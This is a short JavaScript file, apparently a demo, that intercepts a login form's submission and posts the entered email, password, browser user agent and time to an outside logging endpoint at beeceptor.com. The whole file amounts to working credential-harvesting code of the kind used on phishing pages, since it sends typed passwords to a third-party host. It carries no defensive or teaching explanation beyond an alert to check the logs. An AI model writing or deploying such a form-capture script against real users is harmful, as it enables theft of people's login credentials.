document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('demoForm');
  const emailInput = document.getElementById('emailInput');
  const passwordInput = document.getElementById('passwordInput');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();  // Prevent the form from submitting normally

    const data = {
      email: emailInput.value,
      password: passwordInput.value,
      userAgent: navigator.userAgent,
      time: new Date().toISOString()
    };

    try {
      const response = await fetch('https://loggers.free.beeceptor.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      console.log('Submitted to Beeceptor:', data);
      alert('Form submitted! (Check Beeceptor logs)');
    } catch (error) {
      console.error('Submission failed:', error);
      alert('Submission failed');
    }
  });
});
